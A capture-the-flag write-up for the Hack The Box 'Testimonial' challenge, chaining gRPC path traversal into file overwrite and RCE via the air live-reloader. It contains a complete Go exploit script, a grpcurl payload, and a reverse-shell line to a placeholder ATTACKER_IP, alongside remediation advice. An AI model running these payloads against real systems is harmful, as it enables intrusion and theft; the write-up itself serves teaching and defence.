# HTB — Testimonial

**Category:** Web / gRPC / Path Traversal → RCE

**Difficulty:** Medium

**Tags:** gRPC, path-traversal, arbitrary-file-write, templ, air, live-reload, RCE

## Table of Contents

- [Executive Summary](#1-executive-summary)
- [Architecture](#2-architecture)
- [Reconnaissance](#3-reconnaissance)
- [Source Code Analysis](#4-source-code-analysis)
- [Vulnerability Deep-Dive](#5-vulnerability-deep-dive)
- [Exploitation Chain](#6-exploitation-chain)
- [The Exploit Script](#7-the-exploit-script)
- [Retrieving the Flag](#8-retrieving-the-flag)
- [Troubleshooting Matrix](#9-troubleshooting-matrix)
- [Remediation](#10-remediation)
- [Lessons Learned](#11-lessons-learned)
- [Appendix A — Quick Reference](#appendix-a--quick-reference)
- [Appendix B — Full File Inventory](#appendix-b--full-file-inventory)

## 1. Executive Summary

The Testimonial challenge is a Go web application that accepts user testimonials over a public HTTP form and forwards them to an internal gRPC service that persists them to disk.

Two critical flaws compound:

- The gRPC server performs zero input validation on the `customer` field used to build a filesystem path — an unauthenticated path traversal.

- The gRPC port (`:50045`) binds to all interfaces and is exposed directly, bypassing the HTTP-layer sanitizer that would otherwise have blocked traversal.

Because the target container runs the app under `air` — a Go live-reload tool — overwriting a watched `.templ` source file causes the binary to recompile and restart. Since templ templates are compiled Go, the attacker gains arbitrary code execution in the context of the running server.

**Impact:** Unauthenticated remote code execution as the container user, leading to flag exfiltration.

**Root cause:** Missing input validation on a filesystem sink (`os.WriteFile`), combined with the exposure of a backend service that was assumed to be "internal only."

## 2. Architecture

```text
┌──────────────────────────────────────────────────────────────────┐
│  Single Go binary (main.go)                                      │
│                                                                  │
│  ┌──────────────────┐         ┌──────────────────────────────┐   │
│  │  HTTP  :1337     │         │  gRPC  :50045                │   │
│  │  chi router      │         │  RickyService                │   │
│  │  embed.FS public │         │  SubmitTestimonial           │   │
│  └────────┬─────────┘         └──────────────┬───────────────┘   │
│           │                                   │                  │
│           │  HandleHomeIndex                  │                  │
│           │  → client.SendTestimonial ────────┘                  │
│           │  (SANITIZES customer)             │                  │
│           │                                   │                  │
│           │              os.WriteFile("public/testimonials/%s")  │
│           │                                   │                  │
│           ▼                                   ▼                  │
│     serve embedded snapshot         ← writes to disk ←           │
│     (frozen at build time)                                       │
└──────────────────────────────────────────────────────────────────┘
```

The HTTP layer and the gRPC layer share the same process but present two very different trust boundaries:

- The HTTP handler runs a sanitizer (`client.go`) before calling gRPC.

- The gRPC server is independently reachable on `:50045`, with no sanitization in `grpc.go`.

This means: any actor capable of speaking raw gRPC reaches the vulnerable sink without passing through the sanitizer.

## 3. Reconnaissance

### 3.1 Port scan

```bash
nmap -p- -sV --min-rate 5000 <TARGET>
```

Expected findings:

```text
PORT      STATE SERVICE     VERSION
1337/tcp  open  http        Go net/http (chi router)
50045/tcp open  grpc        gRPC (no TLS)
```

The presence of 50045 is the pivotal discovery. Without it, the challenge is unsolvable from the source alone (see §5.4).

### 3.2 HTTP enumeration

```bash
curl -s http://<TARGET>:1337/ | head
```

The page contains a testimonial submission form. Inspecting the request path reveals:

```http
GET /?customer=test&testimonial=hello HTTP/1.1
Host: <TARGET>:1337
```

A successful submission returns the page again; the testimonial is not reflected (the `public/` directory is served from //go:embed, frozen at build time — see §4.1).

### 3.3 gRPC enumeration

```bash
grpcurl -plaintext <TARGET>:50045 list
# Failed to list services: server does not support the reflection API
# (but a response confirms the port is live)

grpcurl -plaintext -d '{"customer":"test","testimonial":"test"}' \
    <TARGET>:50045 RickyService/SubmitTestimonial
# {"message": "Testimonial submitted successfully"}
```

Two critical facts confirmed:

- The gRPC port accepts external connections.

- The service processes submissions without authentication.

### 3.4 Path traversal proof-of-concept

```bash
grpcurl -plaintext \
    -d '{"customer":"../../../tmp/probe.txt","testimonial":"PWNED"}' \
    <TARGET>:50045 RickyService/SubmitTestimonial
# {"message": "Testimonial submitted successfully"}
```

The response confirms `os.WriteFile` accepted a traversal path. Whether the file actually landed at /tmp/probe.txt is verified later through the RCE stage (see §6). Any error like `no such file or directory` at this step would indicate the target directory does not exist at runtime — an earlier failure mode (§9).

## 4. Source Code Analysis

### 4.1 main.go — the entrypoint

```go
//go:embed public
var FS embed.FS

func main() {
    router := chi.NewMux()
    router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS))))
    router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))
    go startGRPC()
    log.Fatal(http.ListenAndServe(":1337", router))
}

func startGRPC() error {
    lis, err := net.Listen("tcp", ":50045")   // ← binds ALL interfaces
    ...
    s := grpc.NewServer()
    pb.RegisterRickyServiceServer(s, &server{})
    s.Serve(lis)
}
```

Two facts matter:

- `//go:embed public` freezes the entire `public/` directory into the compiled binary at build time. Files written to `public/` at runtime are never served by the HTTP handler. This is why a naive "write a file to `public/testimonials/` and fetch it" attack fails.

- net.Listen("tcp", "`:50045`") binds all interfaces. Whether this port is externally reachable depends on the container's ports: / -p configuration — but the challenge author intends it to be exposed (see §5.4).

### 4.2 grpc.go — the vulnerable sink

```go
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
    if req.Customer == "" {
        return nil, errors.New("Name is required")
    }
    if req.Testimonial == "" {
        return nil, errors.New("Content is required")
    }

    err := os.WriteFile(
        fmt.Sprintf("public/testimonials/%s", req.Customer),
        []byte(req.Testimonial),
        0644,
    )
    if err != nil {
        return nil, err
    }
    return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}
```

This is the vulnerability. `req.Customer` flows unsanitized into `os.WriteFile`. Concrete consequences:

- `os.WriteFile` follows .. path segments and symlinks. No `filepath.Clean`.

- File mode `0644` makes the written file world-readable.

- No length cap in the application (but gRPC's default 4 MB message limit caps the payload).

- Any write target whose parent directory already exists is reachable.

Note the error path: if `os.WriteFile` fails (e.g., parent dir missing), the raw error is returned to the caller via gRPC. This is a useful oracle for exploitation (see §6).

### 4.3 client.go — the broken sanitizer

```go
func (c *Client) SendTestimonial(customer, testimonial string) error {
    for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
        customer = strings.ReplaceAll(customer, char, "")
    }
    _, err := c.SubmitTestimonial(context.Background(), &pb.TestimonialSubmission{
        Customer:    customer,
        Testimonial: testimonial,
    })
    return err
}
```

The `customer` field is sanitized by stripping /\:*?"<>|.. This sanitizer is adequate for the HTTP path: `../../view/home/index.templ` becomes viewhomeindextempl — no traversal possible.

But this sanitizer runs only on the HTTP → gRPC hop. It is client-side-equivalent protection: the server on `:50045` never sees it because an attacker can bypass the HTTP handler entirely.

This is the architectural mistake that turns a "guarded" endpoint into an exploitable one.

### 4.4 handler/home.go — the render trigger

```go
func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
    customer := r.URL.Query().Get("customer")
    testimonial := r.URL.Query().Get("testimonial")
    if customer != "" && testimonial != "" {
        c, err := client.GetClient()
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            // ← missing return
        }
        if err := c.SendTestimonial(customer, testimonial); err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
        }
    }
    return home.Index().Render(r.Context(), w)   // ← the RCE trigger
}
```

The line `home.Index().Render(...)` is what executes the attacker's payload: any code inside Index() runs on every GET /.

The missing return after the first `http.Error` is a separate correctness bug (nil-pointer panic if `GetClient()` fails), not the primary issue.

### 4.5 view/home/index.templ — the reload target

The challenge uses templ, a Go templating engine where templates are compiled into Go functions. The live-reload tool `air` watches `.templ` files, runs `templ generate` (which produces `*_templ.go`), then `go build`, then restarts the binary.

Overwriting this file therefore causes the server to recompile and restart with attacker-controlled code — the pivot from arbitrary-file-write to RCE.

## 5. Vulnerability Deep-Dive

### 5.1 The primitive: arbitrary file write

**Location:** `grpc.go`, `os.WriteFile`
**Type:** Path Traversal (CWE-22) → Arbitrary File Write (CWE-73)
**Severity:** Critical (when combined with a live-reload watcher)

### 5.2 The bypass: direct gRPC

The `client.go` sanitizer is a fake defense. It protects the HTTP handler but not the gRPC server. Because `:50045` is exposed, an attacker reaches `SubmitTestimonial` directly with any `customer` value they want.

### 5.3 The amplifier: air live reload

The container's entrypoint runs `air`, which watches `.templ` and `.go` files. Any modification to those triggers a full rebuild. Because templ templates are compiled Go code, overwriting one is equivalent to injecting Go source into the running application.

### 5.4 The precondition: port 50045 must be exposed

Everything above hinges on 50045 being reachable from the attacker's machine. If the challenge were packaged with only 1337 exposed:

- The HTTP sanitizer is airtight (strips / and .).

- No path from HTTP to `os.WriteFile` with traversal.

- The challenge becomes unsolvable from the given source.

Since the challenge is solvable, 50045 is exposed. The first thing every attacker should do — and every defender should prevent — is confirm this:

```bash
nmap -p 50045 <TARGET>
```

### 5.5 Vulnerability summary table

| ID | Location | Type | Severity |
| --- | --- | --- | --- |
| V1 | grpc.go os.WriteFile | Path Traversal → Arbitrary File Write | Critical |
| V2 | client.go sanitizer | Broken access control (only on HTTP path) | High |
| V3 | main.go :50045 bind | Backend service exposure | High |
| V4 | Container config | Live-reload enabled in production | Critical (amplifier) |
| V5 | client.go WithInsecure() | Plaintext gRPC transport | Low (loopback) |
| V6 | handler/home.go | Missing return after http.Error | Low (DoS) |
| V7 | ptypes.pb.go v1.28.1 | CVE-2024-24786 (protojson DoS) | Medium (unused here) |

## 6. Exploitation Chain

```text
[1] Direct gRPC call to :50045
        │  customer = "../../view/home/index.templ"
        │  testimonial = <malicious templ source>
        ▼
[2] os.WriteFile("public/testimonials/../../view/home/index.templ", payload)
        │  resolves to ─────► view/home/index.templ
        ▼
[3] File on disk changes → inotify event
        │
        ▼
[4] air (fsnotify) detects change → debounce → kill running binary
        │
        ▼
[5] air runs: templ generate && go build -o ./tmp/main .
        │  (malicious .templ compiles into the binary)
        ▼
[6] air starts the new binary
        │
        ▼
[7] attacker: GET http://<target>:1337/
        │  handler.HandleHomeIndex → home.Index().Render() → payload executes
        ▼
[8] exec.Command("/bin/sh","-c","cat /flag*") output
        │  written into the HTTP response body
        ▼
[9] attacker reads flag
```

Step 3 is the crucial detail. There is no explicit "reload" API. The attacker simply writes the file; Air's inotify watcher does the rest. The file write is the trigger.

## 7. The Exploit Script

Place at `challenge/cmd/solve/main.go`. Run from challenge/:

```bash
go run ./cmd/solve -host <TARGET> -grpc-port 50045 -http-port 1337
```

### 7.1 Source

```go
// Place at: challenge/cmd/solve/main.go
package main

import (
    "context"
    "flag"
    "fmt"
    "htbchal/pb"
    "io"
    "log"
    "net/http"
    "regexp"
    "strings"
    "time"

    "google.golang.org/grpc"
)

const traversalCustomer = "../../view/home/index.templ"

const maliciousTempl = `package home

import (
    "os"
    "path/filepath"
)

templ Index() {
    <html>
    <body>
    <pre id="flagdump">{ ReadFlag() }</pre>
    </body>
    </html>
}

func ReadFlag() string {
    matches, err := filepath.Glob("/flag*")
    if err != nil {
        return "glob error: " + err.Error()
    }
    if len(matches) == 0 {
        return "no flag file found"
    }
    data, err := os.ReadFile(matches[0])
    if err != nil {
        return "read error: " + err.Error()
    }
    return string(data)
}
`

var flagRe = regexp.MustCompile(`HTB\{[^}]+\}`)

func main() {
    host      := flag.String("host", "127.0.0.1", "target host")
    grpcPort  := flag.Int("grpc-port", 50045, "gRPC port")
    httpPort  := flag.Int("http-port", 1337, "HTTP port")
    attempts  := flag.Int("attempts", 20, "poll attempts")
    delay     := flag.Duration("delay", 2*time.Second, "delay between polls")
    flag.Parse()

    grpcTarget := fmt.Sprintf("%s:%d", *host, *grpcPort)
    httpURL    := fmt.Sprintf("http://%s:%d/", *host, *httpPort)

    fmt.Printf("[*] gRPC target: %s\n", grpcTarget)
    fmt.Printf("[*] HTTP target: %s\n", httpURL)

    conn, err := grpc.Dial(grpcTarget, grpc.WithInsecure())
    if err != nil {
        log.Fatalf("[-] dial failed: %v", err)
    }
    defer conn.Close()

    client := pb.NewRickyServiceClient(conn)
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()

    resp, err := client.SubmitTestimonial(ctx, &pb.TestimonialSubmission{
        Customer:    traversalCustomer,
        Testimonial: maliciousTempl,
    })
    if err != nil {
        log.Fatalf("[-] gRPC call failed: %v", err)
    }
    fmt.Printf("[+] gRPC response: %s\n", resp.GetMessage())

    fmt.Println("[*] Waiting for air to rebuild ...")

    httpClient := &http.Client{Timeout: 5 * time.Second}
    for i := 0; i < *attempts; i++ {
        body, err := fetch(httpClient, httpURL)
        if err != nil {
            fmt.Printf("  [i] attempt %d: app not responding (%v)\n", i+1, err)
            time.Sleep(*delay)
            continue
        }
        if m := flagRe.FindString(body); m != "" {
            fmt.Printf("\n[+] FLAG: %s\n", m)
            return
        }
        if strings.Contains(body, "flagdump") ||
            strings.Contains(body, "no flag file found") {
            fmt.Printf("  [i] rebuild landed, flag not matched: %.200q\n", body)
        }
        time.Sleep(*delay)
    }
    fmt.Println("\n[-] No flag within polling window.")
}

func fetch(c *http.Client, url string) (string, error) {
    resp, err := c.Get(url)
    if err != nil { return "", err }
    defer resp.Body.Close()
    b, _ := io.ReadAll(resp.Body)
    return string(b), nil
}
```

### 7.2 Payload notes

- Uses filepath.Glob("`/flag*`") — catches `/flag.txt`, `/flag_<random>.txt`, `/flag_<random>` alike. Previous `*.txt` variants miss the case where the entrypoint renames the flag without an extension.

- Uses templ DSL (templ Index() { `<html>...</html>` }). Requires `templ generate` in the reload pipeline.

- Renders the flag into a `<pre>` tag with `id="flagdump"` — this marker lets the polling loop distinguish "payload executed but flag missing" from "no rebuild happened at all."

### 7.3 Expected output (happy path)

```text
[*] gRPC target: 127.0.0.1:50045
[*] HTTP target: http://127.0.0.1:1337/
[+] gRPC response: Testimonial submitted successfully
[*] Waiting for air to rebuild ...

[+] FLAG: HTB{...}
```

## 8. Retrieving the Flag

### 8.1 Why flag.txt cannot be read directly

The container's `entrypoint.sh` typically renames the flag to a randomized path before the app starts:

```sh
FLAG_PATH=/flag_$(head -c16 /dev/urandom | xxd -p).txt
mv /flag.txt $FLAG_PATH
chmod 400 $FLAG_PATH
./app
```

Consequences:

- There is no stable `/flag.txt` path.

- `os.WriteFile` is write-only — you cannot use it to read files.

- Path traversal to a read sink does not exist in this codebase.

Therefore reading the flag requires executing a command — either via the template payload or by way of a reverse shell written into the same sink.

### 8.2 Reading via the payload

The malicious Index() function runs:

```go
filepath.Glob("/flag*")     // → ["/flag_abc123.txt"]
os.ReadFile(matches[0])     // → "HTB{...}"
```

The result is inserted into the rendered HTML. The HTTP client reads it from the response body.

### 8.3 Reading via shell (alternative)

For a reverse shell:

```go
exec.Command("/bin/sh", "-c",
    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1").Start()
```

Start a listener first:

```bash
nc -lvnp 4444
```

The moment `air` finishes the rebuild and restarts the binary, the payload executes — no additional HTTP request needed. The shell lands on the listener.

## 9. Troubleshooting Matrix

Every failure mode is detectable from the solver's output. Diagnose in this order:

| Solver output | Root cause | Fix |
| --- | --- | --- |
| [-] dial failed: connection refused | Port 50045 not exposed | Add -p 50045:50045 (docker run) or ports: ["50045:50045"] (compose) |
| [-] gRPC call failed: ... no such file or directory | public/testimonials/ missing at runtime | Rebuild container with challenge Dockerfile (multi-stage image likely) |
| [+] gRPC response: ... then all attempts app not responding | Container crashed / not running | docker logs &lt;container&gt;; docker ps |
| [+] gRPC response: ... then page unchanged from baseline for 40s | No live-reload watcher (air) running | docker exec &lt;container&gt; ps aux \| grep air — if absent, exploit cannot work |
| rebuild landed, flag not matched: ...'no flag file found' | Rebuild OK, but /flag* glob misses | docker exec &lt;container&gt; ls -la / → adjust glob |
| rebuild landed, flag not matched: ...'read error' | File exists but permission denied | Check chmod on flag |
| Response is 500 / body is a Go compile error | Rebuild OK, payload broke build | docker logs &lt;container&gt; — fix payload |
| [+] FLAG: HTB{...} | Success | — |

### 9.1 Verifying the container setup (60 seconds)

```bash
# 1. Is Air the entrypoint?
docker inspect <container> --format '{{.Config.Cmd}} {{.Config.Entrypoint}}'

# 2. Is Air actually running?
docker exec <container> ps aux | grep -E 'air|go run'

# 3. What does Air watch?
docker exec <container> cat .air.toml 2>/dev/null
# Key fields: include_ext = [...]   cmd = "templ generate && go build ..."

# 4. Does public/testimonials/ exist?
docker exec <container> ls -la public/testimonials/

# 5. Where is the flag?
docker exec <container> ls -la / | grep -i flag
```

All five must be true for the exploit to succeed. If (1), (2), or (3) fails → the exploit cannot work as described; the challenge is packaged differently than expected and would require a different approach.

## 10. Remediation

### 10.1 Fix the traversal at the sink

```go
// grpc.go — corrected
base := filepath.Base(req.Customer)
if base == "" || base == "." || base == ".." {
    return nil, errors.New("invalid customer name")
}
if matched, _ := regexp.MatchString(`^[A-Za-z0-9 _-]{1,64}$`, base); !matched {
    return nil, errors.New("invalid characters in customer name")
}
err := os.WriteFile(
    filepath.Join("public/testimonials", base),
    []byte(req.Testimonial),
    0644,
)
```

### 10.2 Bind the gRPC listener to loopback

```go
lis, err := net.Listen("tcp", "127.0.0.1:50045")   // not ":50045"
```

If the service must be reachable from other hosts, add mutual TLS + authentication.

### 10.3 Remove live-reload from production

`air` is a development tool. Production images must ship the compiled binary and never run a file watcher. Even with the sink fixed, live-reload converts any file-write bug into RCE.

```dockerfile
# Development
CMD ["air", "-c", ".air.toml"]

# Production
COPY --from=builder /app/main /app/main
ENTRYPOINT ["/app/main"]
```

### 10.4 Fix the sanitizer

If the sanitizer is kept, move it to the server (`grpc.go`). Client-side-only sanitization is not a defense; the network is untrusted.

### 10.5 Upgrade dependencies

`ptypes.pb.go` was generated by `protoc-gen-go` v1.28.1, which ties to a `google.golang.org/protobuf` runtime vulnerable to CVE-2024-24786 (infinite loop in `protojson.Unmarshal`). Upgrade to `google.golang.org/protobuf` v1.33.0+ and regenerate.

## 11. Lessons Learned

### For Attackers

- Enumerate every service. A web form is not the only entry point. gRPC on a non-standard port is a common forgotten surface.

- Look at every layer's input handling. A sanitizer on one hop does not protect the next.

- Understand the runtime. Live-reload tools (`air`, modd, reflex) turn file writes into code execution. Detecting them is worth more than any payload.

- Read the Dockerfile. The exploitability often lives in the deployment config, not the source.

### For Defenders

- Sanitize at the sink, not the caller. `filepath.Base` on the server is the only fix that matters.

- Bind internal services to loopback. gRPC on `:50045` should never be exposed unless required, and if required, should be authenticated.

- Never ship live-reload to production. The performance cost is negligible; the risk is catastrophic.

- Client-side validation is not validation. It's UX. Real defenses live on the server.

## Appendix A — Quick Reference

### A.1 Minimal exploit (grpcurl)

```bash
grpcurl -plaintext \
    -import-path . -proto pb/ptypes.proto \
    -d @ <TARGET>:50045 RickyService/SubmitTestimonial <<'EOF'
{
  "customer": "../../view/home/index.templ",
  "testimonial": "package home\n\nimport (\n  \"os\"\n  \"path/filepath\"\n)\n\ntempl Index() {\n  <html><body><pre id=\"flagdump\">{ ReadFlag() }</pre></body></html>\n}\n\nfunc ReadFlag() string {\n  m, _ := filepath.Glob(\"/flag*\")\n  if len(m)==0 { return \"no flag\" }\n  b, _ := os.ReadFile(m[0])\n  return string(b)\n}\n"
}
EOF

sleep 8 && curl -s http://<TARGET>:1337/
```

### A.2 Useful paths

| Path | Role |
| --- | --- |
| public/testimonials/ | The write sink's nominal target |
| view/home/index.templ | The .templ file to overwrite |
| handler/home.go | Fallback overwrite target (.go always watched) |
| /tmp/flag.out | Dump target when .templ pipeline is broken |

### A.3 Common gRPC method paths

| Method | Path |
| --- | --- |
| RickyService/SubmitTestimonial | /RickyService/SubmitTestimonial |
| With package pb; in proto | /pb.RickyService/SubmitTestimonial |

The proto file in this challenge has no package declaration, so the method path is the unprefixed form.

## Appendix B — Full File Inventory

| File | Role | Relevant to exploit? |
| --- | --- | --- |
| main.go | HTTP + gRPC server bootstrap | ✅ Binds :50045 on all interfaces |
| grpc.go | SubmitTestimonial handler | ✅ The sink |
| client.go | gRPC client wrapper + sanitizer | ✅ The broken defense |
| handler/home.go | HTTP handler, render trigger | ✅ The RCE trigger |
| handler/shared.go | Handler wrapper | ❌ |
| pb/ptypes.proto | Schema | ✅ Method path, no package prefix |
| pb/ptypes.pb.go | Generated message code | ❌ (except CVE reference) |
| pb/ptypes_grpc.pb.go | Generated gRPC stubs | ✅ Method registration |
| view/home/index.templ | Target of overwrite | ✅ RCE entry point |
| public/ (embed) | Static assets | ❌ Runtime writes invisible |
| .air.toml (if present) | Live-reload config | ✅ Trigger mechanism |
| entrypoint.sh (if present) | Flag rename | ✅ Flag path randomization |
